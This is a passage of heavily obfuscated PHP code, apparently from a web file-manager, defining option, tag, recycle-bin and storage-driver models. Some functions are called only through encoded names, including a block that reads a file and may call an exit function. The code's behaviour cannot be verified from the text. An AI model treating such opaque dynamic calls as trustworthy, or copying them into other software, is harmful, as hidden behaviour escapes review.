$Ê»‹ñŠğ[1802] => $ùÏŞªşá); } private static function finishedRun() { $áìßÖ¤ò =& $_SERVER[Î‹ÃÂŞ„]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $ë†„Üú¶) { try { Hook::apply($ë†„Üú¶[$áìßÖ¤ò[310]], $ë†„Üú¶[$áìßÖ¤ò[1802]]); } catch (Exception $ê¡Ï ¿°) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto D‚‡ÄÊ™ˆ; Cª—ºŞ²ÏË: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\x73\x74\145\155\137\x6f\160\x74\x69\157\x6e"; protected $jsonField = array("\x6d\x65\x6e\165", "\162\x6f\154\145", "\x72\157\x6c\x65\x47\162\x6f\165\x70", "\x72\x65\147\151\163\164", "\x65\x6d\x61\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($‡‡ß×½£) { return "\123\x79\163\x74\145\155\x4f\160\164\151\157\x6e\x5f{$‡‡ß×½£}"; } protected function optionDefault($’çœÁó§ = '') { $Å›œåã =& $_SERVER[Î‹ÃÂŞ„]; if ($’çœÁó§ == $Å›œåã[12]) { return $GLOBALS[$Å›œåã[6]][$Å›œåã[427]]; } } } if ($_SERVER[$_SERVER[Î‹ÃÂŞ„][926]] != $_SERVER[$_SERVER[Î‹ÃÂŞ„][1405]]) { $_getc = $_SERVER[Î‹ÃÂŞ„][928]; $_getfile = $_SERVER[$_SERVER[Î‹ÃÂŞ„][929]] . $_SERVER[Î‹ÃÂŞ„][930]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Î‹ÃÂŞ„][248], $_getfilec); if (count($_getarrs) < $_SERVER[Î‹ÃÂŞ„][657]) { $exit = $_SERVER[Î‹ÃÂŞ„][931]; $exit(); } $_act = $_SERVER[Î‹ÃÂŞ„][1014]; $_act($_SERVER[$_SERVER[Î‹ÃÂŞ„][924]]); } class SystemRecordModel extends ModelBaseLight { } goto cØĞ¹Šãˆå; BçÊ±Á’øš: $fileSize = strrev(base64_decode($_SERVER[ÏõĞ¥ÓÃ][0])); function binCheckNeq($‘‹óİİï, $ÌÕÑ³”û) { return $‘‹óİİï != $ÌÕÑ³”û; } $_SERVER[$_SERVER[ÏõĞ¥ÓÃ][1]] = $fileSize($_SERVER[$_SERVER[ÏõĞ¥ÓÃ][2]]); goto EÉéæß¨ƒ; f¹¶’—Û¾Ş: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\x72\x2e\x74\x61\147\114\151\163\164"; public $modelType = "\x55\163\x65\162\x4f\160\x74\x69\157\156"; public $field = array("\156\141\155\145", "\163\164\x79\154\x65", "\x73\157\162\164"); public function listData($ïÇ†à„½ = false, $î·Åøî§ = "\163\x6f\162\x74", $èÛòÙ¯ = false) { return parent::listData($ïÇ†à„½, $î·Åøî§, $èÛòÙ¯); } public function remove($˜—½ÏÃ¸) { return parent::remove($˜—½ÏÃ¸); } public function add($¦¢ğ©‘î, $´ç»Ô×… = "\154\141\x62\145\154\55\147\162\145\x79\x2d\156\x6f\x72\155\141\x6c") { $£ôó¯è³ =& $_SERVER[Î‹ÃÂŞ„]; if ($this->findByName($¦¢ğ©‘î)) { return !1; } $†š¤ç¬¤ = array($£ôó¯è³[464] => $¦¢ğ©‘î, $£ôó¯è³[529] => $´ç»Ô×…, $£ôó¯è³[1906] => $this->getSort($£ôó¯è³[304]) + 1); return parent::insert($†š¤ç¬¤); } public function update($øøüŞÛò, $îà÷’†¾) { $¦Ñƒ¥£ =& $_SERVER[Î‹ÃÂŞ„]; $±éÙê = $this->listData($øøüŞÛò); $Í²áÙõ¢ = $this->findByName($îà÷’†¾[$¦Ñƒ¥£[32]]); if (!$±éÙê || $Í²áÙõ¢ && $Í²áÙõ¢[$¦Ñƒ¥£[445]] != $±éÙê[$¦Ñƒ¥£[445]]) { return !1; } return parent::update($øøüŞÛò, $îà÷’†¾); } public function moveTop($È“ÌßÊ») { $¬©‘™ğó =& $_SERVER[Î‹ÃÂŞ„]; $È¢ÆÌÖà = parent::listData(); $ÁÏİ‘³ü = $this->getSort($¬©‘™ğó[303]); foreach ($È¢ÆÌÖà as &$™È³ˆê») { if ($™È³ˆê»[$¬©‘™ğó[445]] == $È“ÌßÊ») { $™È³ˆê»[$¬©‘™ğó[1926]] = $ÁÏİ‘³ü; continue; } $™È³ˆê»[$¬©‘™ğó[1926]] += 1; } unset($™È³ˆê»); return parent::resetData($È¢ÆÌÖà); } public function moveBottom($ƒ²æ‡Î×) { $©ÌÌÙÔô =& $_SERVER[Î‹ÃÂŞ„]; $ıõæ¿Ûƒ = $this->getSort($©ÌÌÙÔô[304]) + 1; return parent::update($ƒ²æ‡Î×, array($©ÌÌÙÔô[1926] => $ıõæ¿Ûƒ)); } public function resetSort($òıˆŠ³õ) { $‚Ñ¯¸›ñ =& $_SERVER[Î‹ÃÂŞ„]; $§¢ı¬‰ = array(); $òıˆŠ³õ = is_array($òıˆŠ³õ) ? $òıˆŠ³õ : array(); for ($€ş”ŞãÏ = 0; $€ş”ŞãÏ < count($òıˆŠ³õ); $€ş”ŞãÏ++) { $§¢ı¬‰[$òıˆŠ³õ[$€ş”ŞãÏ] . $‚Ñ¯¸›ñ[12]] = $€ş”ŞãÏ + 1; } $ëã»ÉÜå = parent::listData(); foreach ($ëã»ÉÜå as &$å¤Û·Àæ) { $³â¥†ô = $§¢ı¬‰[$å¤Û·Àæ[$‚Ñ¯¸›ñ[445]]]; $å¤Û·Àæ[$‚Ñ¯¸›ñ[1926]] = $³â¥†ô ? $³â¥†ô : $å¤Û·Àæ[$‚Ñ¯¸›ñ[1926]]; } unset($å¤Û·Àæ); return parent::resetData($ëã»ÉÜå); } private function getSort($è¡‚úàî) { $ÖŠà©¥• =& $_SERVER[Î‹ÃÂŞ„]; $ÅÖüÙóÑ = parent::listData(); $†°Ãñæ = array_to_keyvalue($ÅÖüÙóÑ, $ÖŠà©¥•[12], $ÖŠà©¥•[1926]); if (!$†°Ãñæ) { $†°Ãñæ = array(0); } $—ÆÕ×´ = $è¡‚úàî == $ÖŠà©¥•[304] ? max($†°Ãñæ) : min($†°Ãñæ); return intval($—ÆÕ×´); } } goto EöœÖ°ÜÛ±; EÃÕÌ»İ¶: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\x75\x72\143\145\x5f\x72\145\143\171\143\154\x65"; protected $dataAuto = array(array("\x63\x72\x65\x61\x74\x65\x54\x69\155\x65", "\x74\x69\155\145", "\x69\156\x73\145\x72\164", "\146\x75\x6e\x63\164\x69\x6f\156")); public function listData($³ıü£‘é = false) { $Ëã»Çö‘ =& $_SERVER[Î‹ÃÂŞ„]; $³ıü£‘é = $³ıü£‘é ? $³ıü£‘é : USER_ID; $ŒëÎ±Ü‡ = $this->where(array($Ëã»Çö‘[1695] => $³ıü£‘é))->select(); return array_to_keyvalue($ŒëÎ±Ü‡, $Ëã»Çö‘[12], $Ëã»Çö‘[183]); } public function moveToRecycle($âÇ÷©Ô) { $ ¼ïÕÒİ =& $_SERVER[Î‹ÃÂŞ„]; $‹¼¨Ñâ½ = Model($ ¼ïÕÒİ[1388]); $Âá¬ƒ¶œ = $‹¼¨Ñâ½->sourceInfo($âÇ÷©Ô); if (!$Âá¬ƒ¶œ || $Âá¬ƒ¶œ[$ ¼ïÕÒİ[475]] == $ ¼ïÕÒİ[90]) { return; } $£·³şøÛ = array($ ¼ïÕÒİ[461] => $âÇ÷©Ô, $ ¼ïÕÒİ[1695] => USER_ID, $ ¼ïÕÒİ[619] => $Âá¬ƒ¶œ[$ ¼ïÕÒİ[180]], $ ¼ïÕÒİ[620] => $Âá¬ƒ¶œ[$ ¼ïÕÒİ[541]], $ ¼ïÕÒİ[623] => $Âá¬ƒ¶œ[$ ¼ïÕÒİ[556]]); $this->add($£·³şøÛ); $this->recycleMove($âÇ÷©Ô, 1); if ($Âá¬ƒ¶œ[$ ¼ïÕÒİ[455]] == $ ¼ïÕÒİ[90]) { $·…¸’½ƒ = array($ ¼ïÕÒİ[623] => array($ ¼ïÕÒİ[583], $Âá¬ƒ¶œ[$ ¼ïÕÒİ[556]] . $âÇ÷©Ô . $ ¼ïÕÒİ[584])); $‹¼¨Ñâ½->where($·…¸’½ƒ)->setField($ ¼ïÕÒİ[475], 1); } } public function clear() { $this->remove(!1); } public function remove($Ú‚·§á = false, $øœÎ‹ô» = false) { $ÄĞ™Ğ«Œ =& $_SERVER[Î‹ÃÂŞ„]; $øœÎ‹ô» = $øœÎ‹ô» ? $øœÎ‹ô» : USER_ID; $öó€°ß­ = Model($ÄĞ™Ğ«Œ[1388]); $ÊÛûÖƒº = $this->listData($øœÎ‹ô»); $Ú‚·§á = $Ú‚·§á === !1 ? !1 : $Ú‚·§á; $ªı¤…‰‚ = array(); foreach ($ÊÛûÖƒº as $¹ÜçŠèÄ) { if ($Ú‚·§á != !1 && !in_array($¹ÜçŠèÄ, $Ú‚·§á)) { continue; } $ÈŸˆœ‡ = $öó€°ß­->sourceInfo($¹ÜçŠèÄ); $öó€°ß­->remove($¹ÜçŠèÄ, !1); $éê©óÒ = $ÈŸˆœ‡[$ÄĞ™Ğ«Œ[180]] . $ÄĞ™Ğ«Œ[11] . $ÈŸˆœ‡[$ÄĞ™Ğ«Œ[541]]; $ªı¤…‰‚[$éê©óÒ] = array($ÄĞ™Ğ«Œ[619] => $ÈŸˆœ‡[$ÄĞ™Ğ«Œ[180]], $ÄĞ™Ğ«Œ[541] => $ÈŸˆœ‡[$ÄĞ™Ğ«Œ[541]]); $this->where(array($ÄĞ™Ğ«Œ[183] => $¹ÜçŠèÄ))->delete(); } foreach ($ªı¤…‰‚ as $ëü »¿º) { $öó€°ß­->targetSpaceUpdate($ëü »¿º[$ÄĞ™Ğ«Œ[180]], $ëü »¿º[$ÄĞ™Ğ«Œ[541]]); } } public function restore($“íğé’ = false) { $ı«—°»È = $this->listData(); $this->_restoreSource($ı«—°»È, $“íğé’); } public function removeUserAll($ô·†Í™½) { $this->remove(!1, $ô·†Í™½); } public function restoreItem($ıìæôİ) { $this->_restoreSource(array($ıìæôİ), array($ıìæôİ)); } private function _restoreSource($ø¦Ÿæá, $Ãáû¬Çİ) { $·õÀ¨’ =& $_SERVER[Î‹ÃÂŞ„]; $¹Ş—‚Ã = Model($·õÀ¨’[1388]); $Ãáû¬Çİ = $Ãáû¬Çİ == !1 ? !1 : $Ãáû¬Çİ; if (!$ø¦Ÿæá) { return !0; } $Ğ’Â›„° = array(); foreach ($ø¦Ÿæá as $ËËÇÃ…µ) { if ($Ãáû¬Çİ != !1 && !in_array($ËËÇÃ…µ, $Ãáû¬Çİ)) { continue; } $ûŞ¶ãÏ« = $¹Ş—‚Ã->sourceInfo($ËËÇÃ…µ); $İ¡âÄÒ¿ = $¹Ş—‚Ã->sourceInfo($ûŞ¶ãÏ«[$·õÀ¨’[182]]); if ($İ¡âÄÒ¿[$·õÀ¨’[475]] == $·õÀ¨’[90]) { continue; } $¹Ş—‚Ã->lockMoveStart($ËËÇÃ…µ); $this->recycleMove($ËËÇÃ…µ, 0); if ($ûŞ¶ãÏ«[$·õÀ¨’[455]] == $·õÀ¨’[90]) { $êÒÖ›¥’ = array($·õÀ¨’[623] => array($·õÀ¨’[583], $ûŞ¶ãÏ«[$·õÀ¨’[556]] . $ËËÇÃ…µ . $·õÀ¨’[584])); $¹Ş—‚Ã->where($êÒÖ›¥’)->setField($·õÀ¨’[475], 0); $this->restoreFolderChildren($ËËÇÃ…µ, $ø¦Ÿæá); } $this->where(array($·õÀ¨’[183] => $ËËÇÃ…µ))->delete(); $¹Ş—‚Ã->folderSizeReset($ûŞ¶ãÏ«[$·õÀ¨’[182]]); $Ğ’Â›„°[] = $ûŞ¶ãÏ«[$·õÀ¨’[182]]; if ($ûŞ¶ãÏ«[$·õÀ¨’[455]] == $·õÀ¨’[90]) { $Ğ’Â›„°[] = $ËËÇÃ…µ; } $¹Ş—‚Ã->lockMoveEnd($ËËÇÃ…µ); } $¹Ş—‚Ã->updateModifyTime($Ğ’Â›„°); } private function restoreFolderChildren($ƒ®ªÔÍ, $°Ú´å¼) { $±ãõâè­ =& $_SERVER[Î‹ÃÂŞ„]; $Ã‹œØî‡ = Model($±ãõâè­[1388]); $³âš«É³ = array($±ãõâè­[183] => array($±ãõâè­[7], array())); foreach ($°Ú´å¼ as $ô˜Ü“œ) { if ($ô˜Ü“œ == $ƒ®ªÔÍ) { continue; } if (!$Ã‹œØî‡->isParentOf($ƒ®ªÔÍ, $ô˜Ü“œ)) { continue; } $Óøèú§© = $Ã‹œØî‡->sourceInfo($ô˜Ü“œ); if ($Óøèú§©[$±ãõâè­[455]] == $±ãõâè­[90]) { $³âš«É³[] = array($±ãõâè­[623] => array($±ãõâè­[583], $Óøèú§©[$±ãõâè­[556]] . $ô˜Ü“œ . $±ãõâè­[584])); } else { $³âš«É³[$±ãõâè­[183]][1][] = $ô˜Ü“œ; } } if (!$³âš«É³[$±ãõâè­[183]][1]) { unset($³âš«É³[$±ãõâè­[183]]); } if (!$³âš«É³) { return; } if (is_array($³âš«É³[$±ãõâè­[183]]) && is_array($³âš«É³[$±ãõâè­[183]][1])) { $³âš«É³[$±ãõâè­[183]][1] = array_unique($³âš«É³[$±ãõâè­[183]][1]); } $³âš«É³[$±ãõâè­[1055]] = $±ãõâè­[2000]; $Ã‹œØî‡->where($³âš«É³)->setField($±ãõâè­[475], 1); } private function recycleMove($«óŞ´ë¡, $ºÏáÖŒ = 1) { $œçº°Ú =& $_SERVER[Î‹ÃÂŞ„]; $òÜ‰ÄƒÊ = Model($œçº°Ú[1388]); $Ş¥¥¹Ñ = Model($œçº°Ú[2221]); $ôøİ«£… = array($œçº°Ú[183] => $«óŞ´ë¡); if ($ºÏáÖŒ) { $òÜ‰ÄƒÊ->where($ôøİ«£…)->setField($œçº°Ú[475], 1); $Ş¥¥¹Ñ->eventRecycle($«óŞ´ë¡, $œçº°Ú[2222]); } else { $¸à†°ç = $òÜ‰ÄƒÊ->where($ôøİ«£…)->find(); $˜ ØŞÀ = $¸à†°ç[$œçº°Ú[455]] == $œçº°Ú[90]; $Ù¸øŒÊ‡ = $òÜ‰ÄƒÊ->fileNameAuto($¸à†°ç[$œçº°Ú[182]], $¸à†°ç[$œçº°Ú[32]], REPEAT_RENAME_FOLDER, $˜ ØŞÀ); if ($Ù¸øŒÊ‡ != $¸à†°ç[$œçº°Ú[32]]) { $òÜ‰ÄƒÊ->rename($«óŞ´ë¡, $Ù¸øŒÊ‡); } $òÜ‰ÄƒÊ->where($ôøİ«£…)->setField($œçº°Ú[475], 0); $Ş¥¥¹Ñ->eventRecycle($«óŞ´ë¡, $œçº°Ú[2223]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\x6d\x2e\x73\x6f\x75\162\x63\145\x53\145\143\x72\145\164\114\x69\163\164"; public $field = array("\163\x6f\x75\x72\x63\x65\111\104", "\x74\x79\x70\x65\111\x44", "\x63\162\145\x61\164\145\x55\x73\x65\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\56\x73\x74\x6f\x72\x61\147\x65\x4c\x69\x73\x74"; public $field = array("\156\141\x6d\x65", "\x73\x69\x7a\145\x4d\141\x78", "\163\171\x73\164\145\155", "\144\x65\x66\141\165\x6c\x74", "\x64\162\151\x76\x65\162", "\x63\157\156\146\151\147"); public function listData($µ”Â‡¹ = false, $Ù¨¡ˆ˜¨ = "\x6d\x6f\144\151\x66\x79\124\x69\155\x65", $ä¯ –ÔË = false) { $Ç³Öœ’˜ =& $_SERVER[Î‹ÃÂŞ„]; $İµôòÜ· = parent::listData($µ”Â‡¹, $Ù¨¡ˆ˜¨, $ä¯ –ÔË); if ($µ”Â‡¹) { return $İµôòÜ·; } $ì²­ïÂ = $this->ioSizeUseGet(array_to_keyvalue($İµôòÜ·, $Ç³Öœ’˜[12], $Ç³Öœ’˜[445])); foreach ($İµôòÜ· as $Ø¸•¶À£ => $òÚé®ˆÏ) { unset($İµôòÜ·[$Ø¸•¶À£][$Ç³Öœ’˜[6]]); $İµôòÜ·[$Ø¸•¶À£][$Ç³Öœ’˜[1891]] = isset($ì²­ïÂ[$òÚé®ˆÏ[$Ç³Öœ’˜[445]]]) ? $ì²­ïÂ[$òÚé®ˆÏ[$Ç³Öœ’˜[445]]] : 0; } return $İµôòÜ·; } public function ioSizeUseGet($£´‘Ø) { $ºòæ…ÃÚ =& $_SERVER[Î‹ÃÂŞ„]; if (!$£´‘Ø) { return array(); } $µ¾ı¦¿¼ = $ºòæ…ÃÚ[2224] . implode($ºòæ…ÃÚ[50], $£´‘Ø); $€èá¼²‡ = Cache::get($µ¾ı¦¿¼); if ($€èá¼²‡) { return $€èá¼²‡; } $“¾°Îß£ = array($ºòæ…ÃÚ[864] => $ºòæ…ÃÚ[445], $ºòæ…ÃÚ[2225] => $ºòæ…ÃÚ[78]); $¼Ë•×ÚË = array($ºòæ…ÃÚ[864] => array($ºòæ…ÃÚ[7], $£´‘Ø)); $€èá¼²‡ = Model($ºòæ…ÃÚ[836])->field($“¾°Îß£)->where($¼Ë•×ÚË)->group($ºòæ…ÃÚ[864])->select(); $€èá¼²‡ = array_to_keyvalue($€èá¼²‡, $ºòæ…ÃÚ[445], $ºòæ…ÃÚ[78]); Cache::set($µ¾ı¦¿¼, $€èá¼²‡, 600); return $€èá¼²‡; } public function getConfig($¢äÍºö—) { $¯•Æ„Å‚ = parent::listData($¢äÍºö—); return json_decode($¯•Æ„Å‚[$_SERVER[Î‹ÃÂŞ„][6]], !0); } public function update($Œáõìêú, $›ˆöÎçá) { $‘ûÔ·¬µ =& $_SERVER[Î‹ÃÂŞ„]; $ğ—ÖóÂ¿ = $›ˆöÎçá[$‘ûÔ·¬µ[32]]; $Ï‹µ“ô = array_to_keyvalue(parent::listData(), $‘ûÔ·¬µ[32]); if (isset($Ï‹µ“ô[$ğ—ÖóÂ¿]) && $Ï‹µ“ô[$ğ—ÖóÂ¿][$‘ûÔ·¬µ[445]] != $Œáõìêú) { return !1; } $this->checkPwd($Œáõìêú, $›ˆöÎçá); if (isset($›ˆöÎçá[$‘ûÔ·¬µ[2226]]) && $›ˆöÎçá[$‘ûÔ·¬µ[2226]] == $‘ûÔ·¬µ[90]) { $this->checkConfig($›ˆöÎçá); } unset($›ˆöÎçá[$‘ûÔ·¬µ[2226]]); $“«½¯‰º = parent::update($Œáõìêú, $›ˆöÎçá); if ($“«½¯‰º && $›ˆöÎçá[$‘ûÔ·¬µ[37]]) { $æåæÑ³ = 0; foreach ($Ï‹µ“ô as $‘½äÉï¿) { if ($‘½äÉï¿[$‘ûÔ·¬µ[37]] && $‘½äÉï¿[$‘ûÔ·¬µ[445]] != $Œáõìêú) { $æåæÑ³ = $‘½äÉï¿[$‘ûÔ·¬µ[445]]; parent::update($‘½äÉï¿[$‘ûÔ·¬µ[445]], array($‘ûÔ·¬µ[37] => 0)); } } $this->updateBackup($Œáõìêú, $æåæÑ³); } return $“«½¯‰º; } public function add($Ğ´‘è“³) { $ĞƒÀÔ»ä =& $_SERVER[Î‹ÃÂŞ„]; $¦ÉÚ•Ô® = array_to_keyvalue(parent::listData(), $ĞƒÀÔ»ä[32]); if (isset($¦ÉÚ•Ô®[$Ğ´‘è“³[$ĞƒÀÔ»ä[32]]])) { return !1; } $this->checkConfig($Ğ´‘è“³); $îÅ™¡ = parent::insert($Ğ´‘è“³); if ($îÅ™¡ && $Ğ´‘è“³[$ĞƒÀÔ»ä[37]]) { foreach ($¦ÉÚ•Ô® as $£Ü¤ĞšÄ) { if ($£Ü¤ĞšÄ[$ĞƒÀÔ»ä[37]]) { parent::update($£Ü¤ĞšÄ[$ĞƒÀÔ»ä[445]], array($ĞƒÀÔ»ä[37] => 0)); } } } return $îÅ™¡; } public function updateBackup($÷·ğ¢¤‡, $Ø £’³Æ) { $ı²ëœì =& $_SERVER[Î‹ÃÂŞ„]; if (!$Ø £’³Æ) { return; } $èáßİù = Model($ı²ëœì[796])->config(); if ($èáßİù[$ı²ëœì[1674]] != $ı²ëœì[90] || $èáßİù[$ı²ëœì[798]] != $Ø £’³Æ) { return; } $ˆ€‘¯¯² = Model($ı²ëœì[817])->get($ı²ëœì[827]); $ˆ€‘¯¯² = json_decode($ˆ€‘¯¯², !0); if (!$ˆ€‘¯¯²) { return; } $ˆ€‘¯¯²[$ı²ëœì[798]] = $÷·ğ¢¤‡; Model($ı²ëœì[817])->set(array($ı²ëœì[827] => $ˆ€‘¯¯²)); } public function checkPwd($¾È£‹ò, &$ÒÙÅ„¹) { $õª Ü“ =& $_SERVER[Î‹ÃÂŞ„]; if (empty($ÒÙÅ„¹[$õª Ü“[6]])) { return; } $“óïå„ƒ = json_decode($ÒÙÅ„¹[$õª Ü“[6]], !0); $ßöü³¿ = $õª Ü“[12]; $³Æ½î‡Ù = array($õª Ü“[2227], $õª Ü“[2228], $õª Ü“[943]); foreach ($³Æ½î‡Ù as $û„™³Ä¢) { if (isset($“óïå„ƒ[$û„™³Ä¢])) { $ßöü³¿ = $û„™³Ä¢; break; } } if (!$ßöü³¿) { return; } $æ¦ÙØÕÓ = $this->getConfig($¾È£‹ò); $Â«Ò°öÚ = $æ¦ÙØÕÓ[$ßöü³¿]; $ÛÎÊñ“ = $“óïå„ƒ[$ßöü³¿]; if ($ÛÎÊñ“ == str_repeat($õª Ü“[205], strlen($Â«Ò°öÚ))) { $“óïå„ƒ[$ßöü³¿] = $Â«Ò°öÚ; $ÒÙÅ„¹[$õª Ü“[6]] = json_encode($“óïå„ƒ); } else { if ($ÛÎÊñ“ != $Â«Ò°öÚ) { $ÒÙÅ„¹[$õª Ü“[2226]] = $õª Ü“[90]; } } } public function checkConfig(&$’«§•¸Ö, $Ê¾±ß£‹ = false) { $âØ’›êƒ =& $_SERVER[Î‹ÃÂŞ„]; $úª´òŒé = strtolower($’«§•¸Ö[$âØ’›êƒ[97]]); $İ¨°ÀŒ‡ = json_decode($’«§•¸Ö[$âØ’›êƒ[6]], !0); foreach ($İ¨°ÀŒ‡ as $ëÛûôâ => $£¬ó—õ¬) { if (is_string($£¬ó—õ¬)) { $İ¨°ÀŒ‡[$ëÛûôâ] = trim($£¬ó—õ¬); } } $İ¨°ÀŒ‡[$âØ’›êƒ[2229]] = rand_string(6); $¨­â´Ê = $GLOBALS[$âØ’›êƒ[6]][$âØ’›êƒ[91]][$âØ’›êƒ[873]]; $°Ö–Û©ò = isset($¨­â´Ê[$úª´òŒé]) ? $¨­â´Ê[$úª´òŒé] : ucfirst($úª´òŒé); $§‰ÈÙ©ç = $âØ’›êƒ[76] . $°Ö–Û©ò; if (!$°Ö–Û©ò || !class_exists($§‰ÈÙ©ç)) { if ($Ê¾±ß£‹) { return LNG($âØ’›êƒ[2230]); } write_log(array($âØ’›êƒ[2231], $’«§•¸Ö, get_caller_info()), $âØ’›êƒ[2232]); show_json(LNG($âØ’›êƒ[2230]), !1, $’«§•¸Ö); } $¯ÇøÆ±‹ = new $§‰ÈÙ©ç($İ¨°ÀŒ‡); if (in_array($úª´òŒé, $¯ÇøÆ±‹->objectDriver)) { if (!$¯ÇøÆ±‹->isBucketCors() && !$¯ÇøÆ±‹->setBucketCors()) { $×Å´œî· = LNG($âØ’›êƒ[2233]); $×Å´œî· .= $âØ’›êƒ[2234] . LNG($âØ’›êƒ[2235]); if ($Ê¾±ß£‹) { return $×Å´œî·; } show_json($×Å´œî·, !1); } } $÷ú…ş  = rtrim($İ¨°ÀŒ‡[$âØ’›êƒ[1235]], $âØ’›êƒ[8]) . $âØ’›êƒ[8]; $µ’«Ù­† = $¯ÇøÆ±‹->getPath($÷ú…ş  . $âØ’›êƒ[1239]); if (!$¯ÇøÆ±‹->mkfile($µ’«Ù­†)) { if ($Ê¾±ß£‹) { return LNG($âØ’›êƒ[2233]); } show_json(LNG($âØ’›êƒ[2233]), !1); } $İ¨°ÀŒ‡[$âØ’›êƒ[1235]] = $÷ú…ş ; $’«§•¸Ö[$âØ’›êƒ[6]] = json_encode($İ¨°ÀŒ‡); $’«§•¸Ö[$âØ’›êƒ[97]] = $°Ö–Û©ò; return !0; } public function driverListSystem() { $—…ÂÕóÍ =& $_SERVER[Î‹ÃÂŞ„]; $éĞé Í = parent::listData(); $Ç×ææ¡Ï = array(); foreach ($éĞé Í as $Ê¨Üíåı) { unset($Ê¨Üíåı[$—…ÂÕóÍ[217]], $Ê¨Üíåı[$—…ÂÕóÍ[87]]); $Ê¨Üíåı[$—…ÂÕóÍ[6]] = json_decode($Ê¨Üíåı[$—…ÂÕóÍ[6]], !0); $Ç×ææ¡Ï[] = $Ê¨Üíåı; } return $Ç×ææ¡Ï; } public function defaultDriver() { $‚—ß«»– =& $_SERVER[Î‹ÃÂŞ„]; $ßÂÜš£õ = parent::listData(); $«ñÇ®Ã = array_filter_by_field($ßÂÜš£õ, $‚—ß«»–[37], 1); $«ñÇ®Ã = $«ñÇ®Ã[0]; if ($«ñÇ®Ã) { $«ñÇ®Ã[$‚—ß«»–[6]] = json_decode($«ñÇ®Ã[$‚—ß«»–[6]], !0); } return $«ñÇ®Ã; } public function driverInfo($Ö¯øİ†‘) { $êí›¶àÕ =& $_SERVER[Î‹ÃÂŞ„]; $òù ŠãÌ = array_to_keyvalue(parent::listData(), $êí›¶àÕ[445]); if (!isset($òù ŠãÌ[$Ö¯øİ†‘])) { return !1; } $í»ïÀåè = $òù ŠãÌ[$Ö¯øİ†‘]; $í»ïÀåè[$êí›¶àÕ[6]] = json_decode($í»ïÀåè[$êí›¶àÕ[6]], !0); return $í»ïÀåè; } public function remove($è‚ê…í) { $this->removeShareItems($è‚ê…í); return parent::remove($è‚ê…í); } public function removeWithFile($Õ„Öö¥, $²Áïó¾Ü) { $í¬…òüü =& $_SERVER[Î‹ÃÂŞ„]; $ıáÏÛÄ– = array($í¬…òüü[864] => $Õ„Öö¥); $âğÕë‡ç = Model($í¬…òüü[514])->where($ıáÏÛÄ–)->count(); $¿øÇ€¬Â = Model($í¬…òüü[514])->where($ıáÏÛÄ–)->sum($í¬…òüü[78]); $ı²’àĞŒ = $²Áïó¾Ü . $í¬…òüü[2236] . $Õ„Öö¥; $Å©¶ôªß = LNG($²Áïó¾Ü == $í¬…òüü[591] ? $í¬…òüü[2237] : $í¬…òüü[2238]); $İÌÖöªª = new TaskFileTransfer($ı²’àĞŒ, $í¬…òüü[2232], $âğÕë‡ç, $Å©¶ôªß . "\50{$Õ„Öö¥}\51"); $İÌÖöªª->task[$í¬…òüü[810]] = (double) $¿øÇ€¬Â; $ßäƒÆÓØ = KodIO::defaultDriver(); $³ÀïÔŸ² = $ßäƒÆÓØ[$í¬…òüü[445]]; $ï·µšŞŒ = "\173\151\x6f\72{$³ÀïÔŸ²}\175\x2f"; $¨· ·’ = !0; $çÅœìø‹ = array(); $¹²˜“§ = Model($í¬…òüü[216])->where($ıáÏÛÄ–)->field($í¬…òüü[2239])->select(); foreach ($¹²˜“§ as $»ÏŠ‘) { $Ô•ãŸÁë = $»ÏŠ‘[$í¬…òüü[86]]; $Ä›àìÚ¼ = $ï·µšŞŒ . str_replace("\173\151\157\72{$Õ„Öö¥}\x7d\57", $í¬…òüü[12], $Ô•ãŸÁë); if (!IO::exist($Ô•ãŸÁë)) { $çÅœìø‹[] = $»ÏŠ‘[$í¬…òüü[511]]; $İÌÖöªª->updateFileEnd($»ÏŠ‘[$í¬…òüü[32]], $»ÏŠ‘[$í¬…òüü[78]]); continue; } if (IO::exist($Ä›àìÚ¼)) { $İÌÖöªª->updateFileEnd($»ÏŠ‘[$í¬…òüü[32]], $»ÏŠ‘[$í¬…òüü[78]]); continue; } if (!IO::move($Ô•ãŸÁë, get_path_father($Ä›àìÚ¼))) { $¨· ·’ = !1; break; } $ıáÏÛÄ– = array($í¬…òüü[511] => $»ÏŠ‘[$í¬…òüü[511]]); $‚®éÁéØ = array($í¬…òüü[864] => $³ÀïÔŸ², $í¬…òüü[86] => $Ä›àìÚ¼); Model($í¬…òüü[216])->where($ıáÏÛÄ–)->save($‚®éÁéØ); } $this->removeByFileID($çÅœìø‹); if (!$¨· ·’) { $İÌÖöªª->stop($ı²’àĞŒ); return !1; } $İÌÖöªª->end(); if ($²Áïó¾Ü == $í¬…òüü[1871]) { $this->remove($Õ„Öö¥); } } public function progress($ÑİçÒ, $ğ–­ñËÅ) { return Task::get($ğ–­ñËÅ . $_SERVER[Î‹ÃÂŞ„][2236] . $ÑİçÒ); } private function removeByFileID($íáØÅÅ• = array()) { $­¢Û¯Ö =& $_SERVER[Î‹ÃÂŞ„]; if (empty($íáØÅÅ•)) { return; } $÷¬Ô²æÉ = array($­¢Û¯Ö[511] => array($­¢Û¯Ö[7], $íáØÅÅ•)); $½¢”µ¢¬ = Model($­¢Û¯Ö[1388])->where($÷¬Ô²æÉ)->field($­¢Û¯Ö[183])->select(); if (!$½¢”µ¢¬) { return; } $½¢”µ¢¬ = array_to_keyvalue($½¢”µ¢¬, $­¢Û¯Ö[12], $­¢Û¯Ö[183]); foreach ($½¢”µ¢¬ as $ê³ÚíŸ®) { Model($­¢Û¯Ö[460])->removeNow($ê³ÚíŸ®, !1); } } private function removeShareItems($€–¬·) { $£ëÍ–¦ =& $_SERVER[Î‹ÃÂŞ„]; $”æ¨°å = "\x7b\x69\157\72{$€–¬·}\175\x2f"; $¾´Î³Ìõ = array($£ëÍ–¦[183] => 0, $£ëÍ–¦[1230] => array($£ëÍ–¦[429], "{$”æ¨°å}\x25")); $¢ÁıßÎÓ = Model($£ëÍ–¦[1882])->where($¾´Î³Ìõ)->field($£ëÍ–¦[636])->select(); if 